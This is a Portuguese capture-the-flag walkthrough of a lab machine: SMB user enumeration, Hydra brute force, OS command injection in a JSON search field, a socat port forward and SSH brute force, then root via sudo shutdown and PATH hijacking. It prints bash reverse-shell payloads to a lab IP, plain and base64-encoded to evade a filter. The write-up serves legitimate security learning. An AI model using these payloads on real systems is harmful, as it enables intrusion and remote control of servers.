## Reconhecimento
Iniciamos a máquina realizando o clássico scan de portas com o Nmap.
![Nmap](recon/nmap.png)

Ao acessar a página Web na porta 80 percebmos que ele requisitava uma autenticação. Com isso só nos sobrou tentou explorar o SMB sendo executado na porta 139 e 445. Inicialmente, procurei por vulnerabilidade conhecidas como Eternal Blue. Entretando o serviço não aparentava estar vulnerável a nenhuma CVE. Indo para o próximo passo, resolvi tentar enumerar algumas informações. Para isso usei o `enum4linux` e consegui algumas informações interessantes com ele. O que me chamou mais a atenção foram dois usuários: `fox` e `rascal` .
![Força Bruta HTTP](recon/smb_users.png)

Com esses usuários resolvi fazer alguns ataques de força bruta na autenticação Web e no próprio SMB usando o THC Hydra. Utilizei da `rockyou` como wordlist e em alguns minutos já possuía as credenciais para a autenticação Web usando o usuário do rascal. 
![Força Bruta HTTP](recon/brute_http.png)

## Exploração
Após autenticar na página me deparei com uma aplicação simples, contendo apenas um campo de busca que retornava no máximo 3 arquivos: 
* creds2.txt;
* fox.txt
* important-data.txt
![home](recon/home.png)

Pelas extensões de tipo texto imaginei que isso não estaria salvo em mum banco de dados. Então descartei um SQL Injection e fui tentar algo que me fazia mais sentido: [OS Injection](https://portswigger.net/web-security/os-command-injection). Ao tentar adicionar concatenadores ded comando como ";", "&" e "|" percebi que havia algum tipo de filtro nesse campo. 
![Filtro no front-end](recon/front_end_filter.gif)

Por sorte aparentava ser apenas uma verificação no front-end, então eu apenas interceptei o tráfego com o Burp Suite e modifiquei o campo `target` da requisição. Tentei várias payload e a primeira que deu resultado foi utilizando '`' - acento grave - que no bash executa um comando de dentro de uma string. Utilizei do seguinte JSON para provar a falha: 
```{"target":"`sleep 5`"}```

Como o Servidor demorou a responder pudemos ter certeza que o comando *sleep* foi executado. A partir disso tentei executar uma shell reversa, porém me deparei novaemnte com um filtro. Dessa vez no back-end, então seria mais chato de fazer o bypassar. 
```{"target":"`bash -i >& /dev/tcp/10.6.61.255/4242 0>&1`"}```
![Filtro de Reverse](exploit/filter.png)

Depois de me frustrar bastante, consegui encontrar um jeito de fazer o bypass através de um codificação com base64. Nessa payload eu estou mandando o servidor imprimir (echo) um valor codificado em base 64, que é a mesma payload que usei anteriormente. Após isso, o pip - `|` - joga saída no comando `base64 -d` decodifica o valor para a Shell Reversa original e por fim outro pipe para jogar essa saída no `bash`, executando meu código malicioso.
{"target":"`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC42LjYxLjI1NS80MjQyIDA+JjE= | base64 -d | bash`"}
![Bypass](exploit/bypass_filter.png)
![Reverse Shell](exploit/reverse_shell.png)
Estamos dentro do servidor com o usuário `www-data`!!

## Movimentação Lateral
Agora começamos a fase de enumeração local buscando vetores de movimentação. Após um tempo procurando percebi que havia uma porta 22 aberta locamente o que indicaria que seria possível realizar uma sessão SSH para outro usuário. Verificar o arquivo de configuração do SSH percebemos que apenas o usuário *fox* possui essa permissão. 
![SSH Config](privesc/sshd_config.png)

Para explorar isso eu realizei um *Port Foward*, fazendo com que um serviço rodando em uma porta local seja exposto em uma outra porta externa. Foi necessário primeiro enviar um binário `socat` a partir da minha máquina para o servidor, utilizei minha máquina como servidor web e baixei-o no alvo com um `wget`.
![Web Server Socat](privesc/web_server_socat.png)
![Wget Socat](privesc/wget_socat.png)

Após isso, basta executar nosso socat abrindo a porta 9595 refletindo o serviço SSH local da porta 22.
![Port Foward](privesc/port_fowarding.png)
Agora basta realizar outro ataque de força bruta. 
![Brute SSH](privesc/brute_ssh.png)
![Fox Shell](privesc/fox_shell.png)
Logados em outro usuário já é possível obter a *"user flag"* na home do fox.

## Movimentação Horiontal
A enumeração aqui foi simples, apenas executei um `sudo -l` e percebi que o usuário podia executar o binário shutdown como root. 
![Sudo](privesc/sudo.png)

Para analisá-lo melhor mandei para minha máquina utilizando a técnica do sevidor web.  
![Shutdown Server](privesc/shutdown_server.png)
![Getting Shutdown](privesc/getting_shutdown.png)

Ao executar o comando `strings` no bináro vemos que há uma chamada para o binário `poweroff`. Esse será nosso vetor de escalação! A técnica aqui não é tão simples, vamos precisar de 3 passos basicamente:
- Adicionar a pasta /tmp no início do PATH para que ele tenha prioridaded sobre os outros bináros
- Clonar o `/bin/bash` para a pasta /tmp renomeando-o para `poweroff`
- Executar `sudo /usr/sbin/shutdown` 

![Root](privesc/root.png)